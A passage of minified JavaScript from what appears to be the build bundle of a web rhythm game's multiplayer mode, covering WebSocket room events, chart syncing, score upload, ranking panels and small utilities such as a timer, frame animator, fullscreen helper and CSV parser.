e.room.players[n.extraInfo.id]:e.room.players[n.extraInfo.id].exited=!0;break;case"lock":e.room.stage=1,shared$1.game.graphicHandler.register("whilePlayingHook",jitsRenderer),shared$1.game.msgHandler.sendMessage(e.$t("multiplayer.tips.locked"));break;case"loadChart":e.room.stage=5,e.loadChartFirst(n.extraInfo);break;case"gameStart":e.room.stage=3,e.chartLoaded&&e.launchGame(!0);break;case"allLoadFinish":e.room.stage=2;const o=document.getElementById("waitMsg");o&&(o.innerHTML=shared$1.game.ptmain.$t("multiplayer.tips.waitingToStart")),e.owner&&e.chartLoaded&&e.gameStartUI();break;case"sbScoreUploaded":e.room.players[n.extraInfo.id]=n.extraInfo;break;case"allScoreUploaded":shared$1.game.msgHandler.sendMessage(e.$t("multiplayer.tips.scoreAllUploaded")),e.room.stage=4,e.room.playRounds.length-1<n.extraInfo.n?e.room.playRounds.push(n.extraInfo):e.room.playRounds[n.extraInfo.n]=n.extraInfo,setTimeout(()=>{shared$1.game.ptmain.$route.path!=="/multipanel"&&e.room.stage===4&&e.showStat()},1e4);break;case"nextTrack":btnPlay$2.value=="停止"&&btnPlay$2.click(),e.room.stage=1,e.chartLoaded=!1,e.room.playRound++;for(const l of $$$(".disabled-when-selected"))l.classList.remove("disabled");e.owner?(shared$1.game.ptmain.$router.replace("/chartSelect"),shared$1.game.msgHandler.sendMessage(e.$t("multiplayer.tips.nextRoundStarted.roomOwner"))):(shared$1.game.ptmain.$router.replace("/multipanel"),shared$1.game.msgHandler.sendMessage(e.$t("multiplayer.tips.nextRoundStarted.player")));break}e.evts.unshift(n)}wsHandler.connect(this.wsConn,t)},sortByKey(e,t,n){return e.sort(function(s,r){var o=s[t],l=r[t];return n?o<l?-1:o>l?1:0:o<l?o>l?1:0:-1})},showStat(e="roundRank"){this.panelChoice=e,this.updateRankList(),shared$1.game.ptmain.$router.replace("/multipanel")},async loadChartFirst(e){if(this.chartLoaded=!1,this.speedInfo=e.speedInfo,e.songData.song.startsWith("/PTVirtual/")&&!await checkLocalChart(e.songData.id)){shared$1.game.msgHandler.sendMessage(shared$1.game.ptmain.$t("multiplayer.tips.cantFindChartLocally",[e.songData.name,e.songData.id])),sessionStorage.setItem("loadedChart",JSON.stringify(e.chartData)),sessionStorage.setItem("chartDetailsData",JSON.stringify(e.songData)),shared$1.game.ptmain.$router.replace({path:"/chartUpload",query:{target:e.songData.id}});return}shared$1.game.loadHandler.l(shared$1.game.ptmain.$t("loadChart.loading"),"loadChart"),shared$1.game.ptmain.loadChart(e.songData,e.chartData,this.loadChartSecond),shared$1.game.ptmain.$router.replace({path:"/chartSelect",query:{toSyncOrPlay:3}})},loadChartSecond(e,t){if(this.chartLoaded=!0,recordMgr.chartInfo={songData:e,chartData:t,speedInfo:this.speedInfo},this.owner&&this.room.stage===2){this.gameStartUI(),shared$1.game.loadHandler.r("loadChart");return}if(this.room.stage===3){this.launchGame(),shared$1.game.loadHandler.r("loadChart");return}const n=async()=>{try{const s=JSON.parse(sessionStorage.getItem("loadedChart"));shared$1.game.ptmain.shouldNotUploadPhiZone||await shared$1.game.ptmain.genPlayToken(),await wsHandler.send("loadChartFinish")}catch{shared$1.game.loadHandler.r("playChart"),shared$1.game.loadHandler.r("loadChart"),shared$1.game.msgHandler.sendMessage(shared$1.game.ptmain.$t("multiplayer.failed_tryAfter3Sec"),"error"),setTimeout(n,3e3);return}};n()},launchGame(e=!1){const t=()=>{this.panelOpen=!1,this.gaming=!0,shared$1.game.ptmain.playChart({speed:this.speedInfo.disp,mirror:!1,practiseMode:!1,previewMode:!1,adjustOffset:!1}),shared$1.game.loadHandler.r("waitToStartGame")};if(this.room.compete_mode&&this.owner||wsHandler.send("JITS",{first:!0,score:0,acc:0}),this.JITSStart(),e){t();return}shared$1.game.msgHandler.warning(shared$1.game.ptmain.$t("multiplayer.gameStartedWarning.body"),shared$1.game.ptmain.$t("multiplayer.gameStartedWarning.title"),shared$1.game.ptmain.$t("info.confirm")).then(()=>{if(this.chartLoaded===!1){shared$1.game.msgHandler.sendMessage(shared$1.game.ptmain.$t("multiplayer.gameStartedWarning.chartStillLoading"));return}t()})},syncChart(e,t,n){return new Promise((s,r)=>{e.origin&&(e.origin.song&&(e.song=e.origin.song),e.origin.illustration&&(e.illustration=e.origin.illustration),delete e.origin),t.origin&&(t.origin.chart&&(t.chart=t.origin.chart),delete t.origin);const o={val:0,disp:n};for(const l of $$$(".disabled-when-selected"))l.classList.add("disabled");wsHandler.send("syncChartInfo",{songData:e,chartData:t,speedInfo:o}).then(()=>{shared$1.game.loadHandler.l(shared$1.game.ptmain.$t("multiplayer.waitToStartGame"),"waitToStartGame"),this.room.stage=5,s(!0)}).catch(()=>r(!1))})},gameStartUI(){shared$1.game.msgHandler.success(shared$1.game.ptmain.$t("multiplayer.gameStartUI.body"),shared$1.game.ptmain.$t("multiplayer.gameStartUI.title"),shared$1.game.ptmain.$t("multiplayer.gameStartUI.start")).then(e=>{this.gameStart().catch(()=>{shared$1.game.msgHandler.sendMessage(shared$1.game.ptmain.$t("multiplayer.failed_tryAfter3Sec"),"error"),setTimeout(this.gameStart,3e3)})})},gameStart(){return wsHandler.send("startGamePlay")},uploadScore(){this.JITSStop();const e=shared$1.game.stat;let t={accNum:e.accNum,accStr:e.accStr,all:e.all,bad:e.bad,good:e.good,great:e.great,perfect:e.perfect,scoreNum:e.scoreNum,scoreStr:e.scoreStr,maxcombo:e.maxcombo,extra:"",playbackFile:shared$1.game.recordMgr.export()[0]};e.lineStatus==1||e.lineStatus==2?t.extra="ALL PERFECT":e.lineStatus==3&&(t.extra="FULL COMBO"),wsHandler.send("uploadScoreInfo",t).then(async n=>{this.gaming=!1}).catch(()=>{shared$1.game.msgHandler.sendMessage(shared$1.game.ptmain.$t("multiplayer.uploadFailed_tryAfter3Sec")),setTimeout(this.uploadScore,3e3)})},nextTrack(){wsHandler.send("nextTrack")},scoreStr(e){const t=e.toFixed(0);return"0".repeat(t.length<7?7-t.length:0)+t}},watch:{rankFull:{handler(e,t){e&&shared$1.game.msgHandler.sendMessage(shared$1.game.ptmain.$t("multiplayer.tips.exitRankFull"))}},panelOpen:{handler(e,t){e?(document.body.style.overflow="hidden",window.scrollTo(0,0)):document.body.style.overflow="scroll"}},panelChoice:{handler(e,t){["playerRank","roundRank"].includes(e)&&this.updateRankList()},rankMethod:{handler(e,t){shared$1.game.ptmain.gameConfig.defaultRankMethod=e}}},exited:{handler(e,t){e&&(this.JITSStop(),this.roundRanked=this.roundRanked.reverse(),wsHandler.close())}}},computed:{pzResUrlGlobal(){"res.phizone.cn"},evtsShow(){return this.evts.slice(0,30)},verStr(){return spec.thisVersion}}};$$1("select-bg");$$1("select-bgm");$$1("select-chart");const btnPlay$2=$$1("btn-play"),showTransition$1=$$1("showTransition"),_hoisted_1={key:0,class:"cover-mask"},_hoisted_2={key:0,style:{display:"block",float:"right",position:"absolute",right:".6em",top:"0.3em"}},_hoisted_3={key:1,class:"panelSwitcher"},_hoisted_4={for:"pnc4"},_hoisted_5={for:"pnc0"},_hoisted_6={for:"pnc2"},_hoisted_7={for:"pnc3"},_hoisted_8={class:"divider"},_hoisted_9={id:"multiActions"},_hoisted_10=["value"],_hoisted_11=["value"],_hoisted_12=["value"],_hoisted_13=["value"],_hoisted_14=["value"],_hoisted_15=["value"],_hoisted_16=["value"],_hoisted_17=createBaseVNode("br",null,null,-1),_hoisted_18={class:"divider"},_hoisted_19={key:2},_hoisted_20={key:0},_hoisted_21={id:"sendMsg",style:{margin:"15px"}},_hoisted_22=["placeholder"],_hoisted_23=["value"],_hoisted_24={class:"boxbox"},_hoisted_25={class:"evtbox"},_hoisted_26=["type"],_hoisted_27={key:1},_hoisted_28={key:3},_hoisted_29={key:0,class:"boxbox"},_hoisted_30={class:"scorebox multi-player-list"},_hoisted_31=["onClick"],_hoisted_32={key:0,id:"scoreHeader",class:"color-primary"},_hoisted_33=createBaseVNode("b",null,"Phi",-1),_hoisted_34={id:"scoreExtraInfo"},_hoisted_35={id:"scoreVersion"},_hoisted_36={id:"scoreTime"},_hoisted_37={id:"scoreContent"},_hoisted_38={class:"scoreRanking scoreRankingNoPic"},_hoisted_39={class:"scoreRankingTitle color-primary"},_hoisted_40={class:"scoreRankingBody"},_hoisted_41={class:"scoreRankingBodyColum"},_hoisted_42={class:"scoreRankingEle"},_hoisted_43={class:"scoreRankingNum"},_hoisted_44={class:"scoreRankingExtra"},_hoisted_45={key:0},_hoisted_46={class:"scoreRanking scoreRankingPic"},_hoisted_47={class:"scoreRankingBody"},_hoisted_48={class:"scoreRankingBodyColum"},_hoisted_49={class:"scoreRankingBodyLR"},_hoisted_50={class:"scoreSongCard"},_hoisted_51=["src"],_hoisted_52={class:"songCardName"},_hoisted_53={class:"songCardLevel"},_hoisted_54={class:"scoreRankingEle"},_hoisted_55={class:"scoreRankingNum"},_hoisted_56=["onClick"],_hoisted_57={class:"scoreRankingExtra"},_hoisted_58={class:"scoreRankingBodyLR"},_hoisted_59={class:"scoreRankingEle"},_hoisted_60={class:"scoreRankingNum"},_hoisted_61=["onClick"],_hoisted_62={class:"scoreRankingExtra"},_hoisted_63={key:1},_hoisted_64={class:"scoreRanking scoreRankingPerson"},_hoisted_65={class:"scoreRankingTitle color-primary"},_hoisted_66={class:"scoreRankingBody"},_hoisted_67={class:"scoreRankingBodyColum"},_hoisted_68={class:"scoreRankingCardEle"},_hoisted_69={key:0,class:"scoreSongCard"},_hoisted_70=["src"],_hoisted_71=["onClick"],_hoisted_72={class:"songCardID"},_hoisted_73={class:"songCardName"},_hoisted_74={key:0,class:"songCardSpeed"},_hoisted_75={class:"songCardLevel"},_hoisted_76={class:"songCardScore"},_hoisted_77={class:"songCardAcc"},_hoisted_78={key:0,class:"scoreRanking scoreRankingPerson"},_hoisted_79={class:"scoreRankingTitle color-primary"},_hoisted_80={class:"scoreRankingBody"},_hoisted_81={class:"scoreRankingBodyColum"},_hoisted_82={class:"scoreRankingCardEle"},_hoisted_83={key:0,class:"scoreSongCard"},_hoisted_84=["src"],_hoisted_85=["onClick"],_hoisted_86={class:"songCardID"},_hoisted_87={class:"songCardName"},_hoisted_88={key:0,class:"songCardSpeed"},_hoisted_89={class:"songCardLevel"},_hoisted_90={class:"songCardScore"},_hoisted_91={class:"songCardAcc"};function _sfc_render(e,t,n,s,r,o){return openBlock(),createElementBlock("div",null,[e.panelOpen?(openBlock(),createElementBlock("div",_hoisted_1)):createCommentVNode("",!0),e.panelOpen?(openBlock(),createElementBlock("div",{key:1,class:normalizeClass({cover:!0,coverFull:e.rankFull})},[e.forceOpen?createCommentVNode("",!0):(openBlock(),createElementBlock("div",_hoisted_2,[createBaseVNode("input",{type:"button",id:"close",onClick:t[0]||(t[0]=l=>e.panelOpen=!1),style:{background:"unset"},value:"❌"})])),e.room.stage>0&&["messages","playerRank","roundRank","players"].includes(e.panelChoice)?(openBlock(),createElementBlock("div",_hoisted_3,[createBaseVNode("div",null,[withDirectives(createBaseVNode("input",{type:"radio",id:"pnc4",name:"panelChoice","onUpdate:modelValue":t[1]||(t[1]=l=>e.panelChoice=l),value:"messages"},null,512),[[vModelRadio,e.panelChoice]]),createBaseVNode("label",_hoisted_4,toDisplayString$1(e.$t("multiplayer.panels.messages.title")),1)]),createBaseVNode("div",null,[withDirectives(createBaseVNode("input",{type:"radio",id:"pnc0",name:"panelChoice","onUpdate:modelValue":t[2]||(t[2]=l=>e.panelChoice=l),value:"players"},null,512),[[vModelRadio,e.panelChoice]]),createBaseVNode("label",_hoisted_5,toDisplayString$1(e.$t("multiplayer.panels.playerList.title")),1)]),createBaseVNode("div",null,[withDirectives(createBaseVNode("input",{type:"radio",id:"pnc2",name:"panelChoice","onUpdate:modelValue":t[3]||(t[3]=l=>e.panelChoice=l),value:"roundRank"},null,512),[[vModelRadio,e.panelChoice]]),createBaseVNode("label",_hoisted_6,toDisplayString$1(e.$t("multiplayer.panels.roundRank.title")),1)]),createBaseVNode("div",null,[withDirectives(createBaseVNode("input",{type:"radio",id:"pnc3",name:"panelChoice","onUpdate:modelValue":t[4]||(t[4]=l=>e.panelChoice=l),value:"playerRank"},null,512),[[vModelRadio,e.panelChoice]]),createBaseVNode("label",_hoisted_7,toDisplayString$1(e.$t("multiplayer.panels.playerRank.title")),1)])])):createCommentVNode("",!0),createBaseVNode("div",_hoisted_8,"——— "+toDisplayString$1(e.$t("multiplayer.operations"))+" ———",1),createBaseVNode("div",_hoisted_9,[["playerRank","roundRank"].includes(e.panelChoice)?(openBlock(),createElementBlock("input",{key:0,type:"button",id:"switchRankMethod2",onClick:t[5]||(t[5]=l=>o.switchRankMethod()),value:e.rankMethod==="score"?e.$t("multiplayer.multiActions.switchToRankByAcc"):e.$t("multiplayer.multiActions.switchToRankByScore")},null,8,_hoisted_10)):createCommentVNode("",!0),["messages","playerRank","roundRank","players"].includes(e.panelChoice)&&e.owner&&e.room.stage===4&&!e.exited?(openBlock(),createElementBlock("input",{key:1,type:"button",onClick:t[6]||(t[6]=l=>o.nextTrack()),value:e.$t("multiplayer.multiActions.nextTrack")},null,8,_hoisted_11)):createCommentVNode("",!0),["messages","playerRank","roundRank","players"].includes(e.panelChoice)&&e.owner&&e.room.stage===0?(openBlock(),createElementBlock("input",{key:2,type:"button",id:"lockRoom",onClick:t[7]||(t[7]=l=>o.lockRoom()),value:e.$t("multiplayer.multiActions.lockRoom")},null,8,_hoisted_12)):createCommentVNode("",!0),["messages","playerRank","roundRank","players"].includes(e.panelChoice)&&!e.exited?(openBlock(),createElementBlock("input",{key:3,type:"button",id:"exitRoom",onClick:t[8]||(t[8]=l=>o.exitRoom()),value:e.owner?e.$t("multiplayer.multiActions.closeRoom"):e.$t("multiplayer.multiActions.exitRoom")},null,8,_hoisted_13)):createCommentVNode("",!0),["playerRank","roundRank"].includes(e.panelChoice)&&e.exited?(openBlock(),createElementBlock("input",{key:4,type:"button",onClick:t[9]||(t[9]=l=>e.rankFull=!0),value:e.$t("multiplayer.multiActions.rankFull")},null,8,_hoisted_14)):createCommentVNode("",!0),["playerRank","roundRank"].includes(e.panelChoice)&&!e.exited&&(!e.room.compete_mode||e.owner)?(openBlock(),createElementBlock("input",{key:5,type:"button",onClick:t[10]||(t[10]=l=>o.downloadAllPlayBack()),value:e.$t("multiplayer.multiActions.downloadAllPlayBack")},null,8,_hoisted_15)):createCommentVNode("",!0),["messages","playerRank","roundRank","players"].includes(e.panelChoice)&&e.exited?(openBlock(),createElementBlock("input",{key:6,type:"button",value:e.$t("multiplayer.multiActions.backToSingle"),onclick:"location.reload(true)"},null,8,_hoisted_16)):createCommentVNode("",!0)]),_hoisted_17,createBaseVNode("div",_hoisted_18,"——— "+toDisplayString$1(e.$t("multiplayer.panels.messages.title"))+" ———",1),e.panelChoice=="messages"||e.room.stage===0?(openBlock(),createElementBlock("div",_hoisted_19,[e.room.stage!==0?(openBlock(),createElementBlock("h1",_hoisted_20,toDisplayString$1(e.$t("multiplayer.panels.messages.messagesList")),1)):createCommentVNode("",!0),createBaseVNode("div",_hoisted_21,[createBaseVNode("input",{id:"sendMsgInput",class:"input",style:{width:"15em","max-width":"100%"},placeholder:e.$t("multiplayer.panels.messages.msgInputPlaceholder")},null,8,_hoisted_22),createBaseVNode("input",{type:"button",id:"msgSend",value:e.$t("multiplayer.panels.messages.send"),onClick:t[11]||(t[11]=l=>o.sendMsg())},null,8,_hoisted_23)]),createBaseVNode("div",_hoisted_24,[createBaseVNode("div",_hoisted_25,[(openBlock(!0),createElementBlock(Fragment,null,renderList(o.evtsShow,(l,d)=>(openBlock(),createElementBlock("p",null,[l.type?(openBlock(),createElementBlock("span",{key:0,type:l.type},toDisplayString$1(l.msg),9,_hoisted_26)):(openBlock(),createElementBlock("span",_hoisted_27,toDisplayString$1(l.msg),1))]))),256))])])])):createCommentVNode("",!0),e.panelChoice=="players"||e.room.stage===0?(openBlock(),createElementBlock("div",_hoisted_28,[createBaseVNode("h1",null,toDisplayString$1(e.$t("multiplayer.panels.playerList.title")),1),e.room&&e.room.players?(openBlock(),createElementBlock("div",_hoisted_29,[createBaseVNode("div",_hoisted_30,[(openBlock(!0),createElementBlock(Fragment,null,renderList(e.room.players,(l,d)=>(openBlock(),createElementBlock("p",{style:normalizeStyle({color:l.online?l.id===e.room.owner?"red":"unset":"grey",display:l.exited===0?"flex":"none"}),onClick:u=>o.actionPlayer(l.id,l.name,l.exited)},[createBaseVNode("div",{style:normalizeStyle({backgroundImage:"url("+l.avatar.replace("res.phi.zone",o.pzResUrlGlobal)+")",filter:l.online?"unset":"grayscale(1)",border:"3px solid "+(l.id===e.room.owner?"red":"var(--color-box-border)")}),class:"multi-user-avatar"},null,4),createTextVNode(" "+toDisplayString$1(l.name),1)],12,_hoisted_31))),256))])])):createCommentVNode("",!0)])):createCommentVNode("",!0),["playerRank","roundRank"].includes(e.panelChoice)?(openBlock(),createElementBlock("div",{key:4,class:normalizeClass({coverFull:e.rankFull,coverFullScore:!0})},[createBaseVNode("div",{class:normalizeClass({scoreMainContainer:!0,noHeaderExtraPadding:!e.exited})},[e.exited?(openBlock(),createElementBlock("div",_hoisted_32,[createBaseVNode("div",{id:"scoreLogo",onClick:t[12]||(t[12]=l=>e.rankFull=!1)}),createBaseVNode("div",{id:"scoreTitle",onClick:t[13]||(t[13]=l=>e.rankFull=!1)},[_hoisted_33,createTextVNode("Together")]),createBaseVNode("div",_hoisted_34,[createBaseVNode("div",_hoisted_35,toDisplayString$1(e.$t("multiplayer.panels.rank.genVer",{verStr:o.verStr})),1),createBaseVNode("div",_hoisted_36,[createBaseVNode("b",null,toDisplayString$1(e.timeStr),1)]),createBaseVNode("div",null,toDisplayString$1(e.rankMethod==="score"?e.$t("multiplayer.multiActions.rankedByScore"):e.$t("multiplayer.multiActions.rankedByAcc")),1)])])):createCommentVNode("",!0),createBaseVNode("div",_hoisted_37,[createBaseVNode("div",_hoisted_38,[createBaseVNode("div",_hoisted_39,toDisplayString$1(e.$t("multiplayer.panels.rank.totalRanking")),1),createBaseVNode("div",_hoisted_40,[createBaseVNode("div",_hoisted_41,[(openBlock(!0),createElementBlock(Fragment,null,renderList(e.rankedUser,(l,d)=>(openBlock(),createElementBlock("div",_hoisted_42,[createBaseVNode("div",_hoisted_43,toDisplayString$1(d+1),1),createBaseVNode("div",{class:"scoreRankingUserName color-primary",style:normalizeStyle({color:l.id===e.user.id?"red":l.playRecord.length-1==e.room.playRound?"var(--color-text-primary)":"grey"})},toDisplayString$1(l.name),5),createBaseVNode("div",_hoisted_44,toDisplayString$1((l.accAvg*100).toFixed(2))+"% "+toDisplayString$1(o.scoreStr(l.scoreAvg)),1)]))),256))])])]),e.panelChoice=="roundRank"?(openBlock(),createElementBlock("div",_hoisted_45,[(openBlock(!0),createElementBlock(Fragment,null,renderList(e.roundRanked,(l,d)=>(openBlock(),createElementBlock("div",_hoisted_46,[createBaseVNode("div",_hoisted_47,[createBaseVNode("div",_hoisted_48,[createBaseVNode("div",_hoisted_49,[createBaseVNode("div",_hoisted_50,[createBaseVNode("img",{src:l.chartInfo.songData.illustration},null,8,_hoisted_51),createBaseVNode("div",{class:"songCardCover",style:normalizeStyle({"--bg":"url("+l.chartInfo.songData.illustration+")"})},[createBaseVNode("div",_hoisted_52,toDisplayString$1(l.chartInfo.songData.name)+" "+toDisplayString$1(l.chartInfo.speedInfo.disp?"("+l.chartInfo.speedInfo.disp+")":""),1),createBaseVNode("div",_hoisted_53,toDisplayString$1(l.chartInfo.chartData.level)+" "+toDisplayString$1(o.getDifficultyActual(l.chartInfo.chartData)),1)],4)]),(openBlock(!0),createElementBlock(Fragment,null,renderList(o.getScoresLR(l.scores,"l"),(u,f)=>(openBlock(),createElementBlock("div",_hoisted_54,[createBaseVNode("div",_hoisted_55,toDisplayString$1(f+1),1),createTextVNode("/ "),createBaseVNode("div",{class:"scoreRankingUserName color-primary",onClick:m=>o.wrappedSinglePlayBack(d,u.id,0),style:normalizeStyle({color:u.id===e.user.id?"red":"var(--color-text-primary)"})},toDisplayString$1(u.name),13,_hoisted_56),createBaseVNode("div",_hoisted_57,toDisplayString$1(u.accStr)+" "+toDisplayString$1(u.scoreStr),1)]))),256))]),createBaseVNode("div",_hoisted_58,[(openBlock(!0),createElementBlock(Fragment,null,renderList(o.getScoresLR(l.scores,"r"),(u,f)=>(openBlock(),createElementBlock("div",_hoisted_59,[createBaseVNode("div",_hoisted_60,toDisplayString$1(f+1+o.getScoresLR(l.scores,"n")),1),createBaseVNode("div",{class:"scoreRankingUserName color-primary",onClick:m=>o.wrappedSinglePlayBack(d,u.id,0),style:normalizeStyle({color:u.id===e.user.id?"red":"var(--color-text-primary)"})},toDisplayString$1(u.name),13,_hoisted_61),createBaseVNode("div",_hoisted_62,toDisplayString$1(u.accStr)+" "+toDisplayString$1(u.scoreStr),1)]))),256))])])])]))),256))])):createCommentVNode("",!0),e.panelChoice==="playerRank"?(openBlock(),createElementBlock("div",_hoisted_63,[createBaseVNode("div",_hoisted_64,[createBaseVNode("div",_hoisted_65,toDisplayString$1(e.$t("multiplayer.panels.playerRank.my",[e.user.name])),1),createBaseVNode("div",_hoisted_66,[createBaseVNode("div",_hoisted_67,[(openBlock(!0),createElementBlock(Fragment,null,renderList(e.room.players[e.user.id].playRecord,(l,d)=>(openBlock(),createElementBlock("div",_hoisted_68,[e.roundRanked[e.exited?d:e.roundRanked.length-d-1]&&e.roundRanked[e.exited?d:e.roundRanked.length-d-1].chartInfo?(openBlock(),createElementBlock("div",_hoisted_69,[createBaseVNode("img",{src:e.roundRanked[e.exited?d:e.roundRanked.length-d-1].chartInfo.songData.illustration},null,8,_hoisted_70),createBaseVNode("div",{class:"songCardCoverAll",onClick:u=>o.wrappedSinglePlayBack(d,e.user.id,1)},[createBaseVNode("div",_hoisted_72,"#"+toDisplayString$1(d+1),1),createBaseVNode("div",_hoisted_73,toDisplayString$1(e.roundRanked[e.exited?d:e.roundRanked.length-d-1].chartInfo.songData.name),1),e.roundRanked[e.exited?d:e.roundRanked.length-d-1].chartInfo.speedInfo.disp?(openBlock(),createElementBlock("div",_hoisted_74," ("+toDisplayString$1(e.roundRanked[e.exited?d:e.roundRanked.length-d-1].chartInfo.speedInfo.disp)+") ",1)):createCommentVNode("",!0),createBaseVNode("div",_hoisted_75,toDisplayString$1(e.roundRanked[e.exited?d:e.roundRanked.length-d-1].chartInfo.chartData.level)+" "+toDisplayString$1(o.getDifficultyActual(e.roundRanked[e.exited?d:e.roundRanked.length-d-1].chartInfo.chartData)),1),createBaseVNode("div",_hoisted_76,toDisplayString$1(l.scoreStr),1),createBaseVNode("div",_hoisted_77,toDisplayString$1(l.accStr),1)],8,_hoisted_71)])):createCommentVNode("",!0)]))),256))])])]),(openBlock(!0),createElementBlock(Fragment,null,renderList(e.room.players,(l,d)=>(openBlock(),createElementBlock("div",null,[d!=e.user.id&&l.playRecord.length>0&&!(e.room.compete_mode&&d==e.room.owner)?(openBlock(),createElementBlock("div",_hoisted_78,[createBaseVNode("div",null,[createBaseVNode("div",_hoisted_79,toDisplayString$1(e.$t("multiplayer.panels.playerRank.others",[l.name])),1),createBaseVNode("div",_hoisted_80,[createBaseVNode("div",_hoisted_81,[(openBlock(!0),createElementBlock(Fragment,null,renderList(l.playRecord,(u,f)=>(openBlock(),createElementBlock("div",_hoisted_82,[e.roundRanked[e.exited?f:e.roundRanked.length-f-1]&&e.roundRanked[e.exited?f:e.roundRanked.length-f-1].chartInfo?(openBlock(),createElementBlock("div",_hoisted_83,[createBaseVNode("img",{src:e.roundRanked[e.exited?f:e.roundRanked.length-f-1].chartInfo.songData.illustration},null,8,_hoisted_84),createBaseVNode("div",{class:"songCardCoverAll",onClick:m=>o.wrappedSinglePlayBack(f,d,1)},[createBaseVNode("div",_hoisted_86,"#"+toDisplayString$1(f+1),1),createBaseVNode("div",_hoisted_87,toDisplayString$1(e.roundRanked[e.exited?f:e.roundRanked.length-f-1].chartInfo.songData.name),1),e.roundRanked[e.exited?f:e.roundRanked.length-f-1].chartInfo.speedInfo.disp?(openBlock(),createElementBlock("div",_hoisted_88," ("+toDisplayString$1(e.roundRanked[e.exited?f:e.roundRanked.length-f-1].chartInfo.speedInfo.disp)+") ",1)):createCommentVNode("",!0),createBaseVNode("div",_hoisted_89,toDisplayString$1(e.roundRanked[e.exited?f:e.roundRanked.length-f-1].chartInfo.chartData.level)+" "+toDisplayString$1(e.roundRanked[e.exited?f:e.roundRanked.length-f-1].chartInfo.chartData.difficulty),1),createBaseVNode("div",_hoisted_90,toDisplayString$1(u.scoreStr),1),createBaseVNode("div",_hoisted_91,toDisplayString$1(u.accStr),1)],8,_hoisted_85)])):createCommentVNode("",!0)]))),256))])])])])):createCommentVNode("",!0)]))),256))])):createCommentVNode("",!0)])],2)],2)):createCommentVNode("",!0)],2)):createCommentVNode("",!0)])}const multiplayerinst=_export_sfc(_sfc_main,[["render",_sfc_render]]),time2Str=(e,t)=>`${Math.floor(e/60)}:${`00${Math.floor(e%60)}`.slice(-2)}${t?(e%1).toFixed(3).slice(-4):""}`;class Timer{constructor(){this.reset()}play(){if(!this.isPaused)throw new Error("Time has been playing");this.t1=performance.now(),this.isPaused=!1}pause(){if(this.isPaused)throw new Error("Time has been paused");this.t0=this.time,this.isPaused=!0}reset(){this.t0=0,this.t1=0,this.isPaused=!0}addTime(t){this.t0+=t}get time(){return this.isPaused?this.t0:this.t0+performance.now()-this.t1}get second(){return this.time/1e3}}const frameTimer={tick:0,time:performance.now(),fps:0,addTick(e=10){return++this.tick>=e&&(this.tick=0,this.fps=1e3*e/(-this.time+(this.time=performance.now()))),this.fps},get fpsStr(){const e=this.fps;return e<10?e.toPrecision(2):e.toFixed(0)},get disp(){return .5/frameTimer.fps||0}};let FrameAnimater$1=class{constructor(){this.callback=t=>{},this.lastTime=0,this.interval=Number.EPSILON,this.id=null,this._animate=this._animate.bind(this),this.animatting=!1,this.forced=!1}_animate(){if(!this.animatting)return;this.forced||(this.id=requestAnimationFrame(this._animate));const t=performance.now();try{if(this.interval==Number.EPSILON)this.callback(t);else{const n=t-this.lastTime;n>=this.interval&&(this.lastTime=t-n%this.interval,this.callback(t))}}catch(n){console.error(n)}this.forced&&setTimeout(this._animate,0)}start(){this.id||this.animatting||(this.lastTime=performance.now(),this.animatting=!0,this.forced?this._animate():this.id=requestAnimationFrame(this._animate))}stop(){this.forced||cancelAnimationFrame(this.id),this.animatting=!1,this.id=null}setCallback(t){if(typeof t!="function")throw new TypeError("callback is not a function");this.callback=t}setFrameRate(t,n=!1){this.interval=Math.abs(1e3/t),isFinite(this.interval)||(this.interval=Number.EPSILON),this.forced=n}};window.FrameAnimater=FrameAnimater$1;const full={toggle(e){if(!this.enabled)return Promise.reject();const t=()=>new Promise((n,s)=>{document.addEventListener(this.onchange,n,{once:!0}),document.addEventListener(this.onerror,s,{once:!0}),orientation.lockLandscape()});if(this.element){if(document.exitFullscreen)return document.exitFullscreen(),t();if(document.webkitExitFullscreen)return document.webkitExitFullscreen(),t();if(document.mozCancelFullScreen)return document.mozCancelFullScreen(),t()}else{if(e instanceof HTMLElement||(e=document.body),e.requestFullscreen)return e.requestFullscreen(),t();if(e.webkitRequestFullscreen)return e.webkitRequestFullscreen(),t();if(e.mozRequestFullScreen)return e.mozRequestFullScreen(),t()}},check(e){return e instanceof HTMLElement||(e=document.body),this.element===e},get onchange(){if(document.onfullscreenchange!==void 0)return"fullscreenchange";if(document.onwebkitfullscreenchange!==void 0)return"webkitfullscreenchange";if(document.onmozfullscreenchange!==void 0)return"mozfullscreenchange"},get onerror(){if(document.onfullscreenerror!==void 0)return"fullscreenerror";if(document.onwebkitfullscreenerror!==void 0)return"webkitfullscreenerror";if(document.onmozfullscreenerror!==void 0)return"mozfullscreenerror"},get element(){return document.fullscreenElement||document.webkitFullscreenElement||document.mozFullScreenElement||null},get enabled(){return document.fullscreenEnabled||document.webkitFullscreenEnabled||document.mozFullScreenEnabled||!1}},orientation={lockLandscape(){const e=screen.orientation;return e?e.lock("landscape"):Promise.reject()},lockPortrait(){const e=screen.orientation;return e?e.lock("portrait-primary"):Promise.reject()},unlock(){const e=screen.orientation;return e?e.unlock():Promise.reject()}};function csv2array(e,t){const n=e.replace(/\ufeff|\r/g,"").split(`
`),s=[];for(const o of n){let l="",d=!1,u=!1;const f=[];for(const m of o)if(m==='"')d?u?(l+=m,u=!1):u=!0:d=!0;else if(m===",")d?u?(f.push(l),l="",d=!1,u=!1):l+=m:(f.push(l),l="");else if(!u)l+=m;else throw"Error 1";if(!d)f.push(l),l="";else if(u)f.push(l),l="",d=!1,u=!1;else throw"Error 2";s.push(f)}if(!t)return s;const r=[];for(let o=1;o<s.length;o++){const l={};for(let d=0;d<s[0].length;d++)l[s[0][d]]=s[o][d];r.push(l)}return r}const getConstructorName=e=>e===null?"Null":e===void 0?"Undefined":e.constructor.name,isUndefined=e=>self[e]===void 0;{try{new EventTarget}catch{self.EventTarget=function(){this.listeners={}},EventTarget.prototype={constructor:EventTarget,addEventListener(n,s){n in this.listeners||(this.listeners[n]=[]),this.listeners[n].push(s)},removeEventListener(n,s){if(!(n in this.listeners))return;const r=this.listeners[n];for(let o=0,l=r.length;o<l;o++)if(r[o]===s){r.splice(o,1);return}},dispatchEvent(n){if(!(n.type in this.listeners))return!0;const s=this.listeners[n.type];for(let r=0,o=s.length;r<o;r++)s[r].call(this,n);return!n.defaultPrevented}}}if(new Error("",{cause:"qwq"}).cause!=="qwq"){class t extends self.Error{constructor(s,{cause:r}={}){super(s),this.cause=r}}self.Error=t}class e extends self.DOMException{constructor(n,s){super(n,s),Error.captureStackTrace?Error.captureStackTrace(this,e):this.stack=new 